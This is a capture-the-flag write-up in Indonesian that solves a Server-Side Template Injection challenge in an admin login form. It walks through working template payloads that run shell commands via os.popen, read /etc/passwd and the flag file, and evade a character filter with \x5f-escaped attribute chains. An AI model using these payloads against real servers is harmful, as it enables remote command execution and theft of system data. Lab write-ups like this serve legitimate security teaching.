# SSTI 2

## Deskripsi Soal

Pada challenge ini, diberikan sebuah aplikasi login admin yang rentan terhadap **Server-Side Template Injection (SSTI)**.

File terkait: ![SSTI2](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.png)

## Identifikasi Kerentanan

Aplikasi menggunakan template engine yang tidak melakukan sanitasi input dengan baik, sehingga memungkinkan terjadinya SSTI.

## Langkah Penyelesaian

1. Buka aplikasi dan temukan form login.
2. Input payload SSTI sederhana, misal: `{{7*9}}` pada field username atau password.

   ![Test Payload](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.1.png)

3. Jika output pada halaman berubah menjadi `63`, maka aplikasi rentan SSTI.

   ![Output](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.2.png)
   
4. Lanjutkan eksploitasi dengan payload lain, misal untuk membaca file:
   ```
   {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
   ```

   ![Eksploitasi File](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.3.png)
   
5. Ternyata payload diatas telah terblok karena beberapa tanda, cara untuk mengelabuinya adalah menggunakan unicode.
   ```
   {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la')|attr('read')()}}
   ```
   ![Berhasil](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.4.png)

6. Kita menggunakan payload lain yang dapat membaca flag tersebut
   ```
   {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

   ```
   ![flag](https://github.com/masibelajar/KWA-A-2025/blob/main/d2/SSTI2.5.png)

## Payload yang Digunakan

- `{{7*7}}`
- `{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
- `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la')|attr('read')()}}`
- `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`

## Referensi


- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

